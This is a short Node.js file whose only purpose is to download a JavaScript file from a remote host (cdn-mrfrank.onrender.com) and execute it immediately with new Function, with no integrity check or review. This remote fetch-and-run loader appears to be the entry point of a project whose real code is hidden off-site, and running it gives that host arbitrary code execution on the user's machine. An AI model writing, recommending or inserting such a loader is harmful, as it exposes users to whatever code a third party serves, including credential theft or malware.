const https = require('https');

const remoteUrl = 'https://cdn-mrfrank.onrender.com/media/subzero/index.js';

https.get(remoteUrl, (res) => {
    let data = '';

    res.on('data', chunk => { data += chunk; });
    res.on('end', () => {
        try {
            console.log('✔ Running remote script...\n');
            const run = new Function(data);
            run(); // Run the fetched code
        } catch (err) {
            console.error('❌ Error executing script:', err);
        }
    });
}).on('error', (err) => {
    console.error('❌ Failed to fetch script:', err);
});
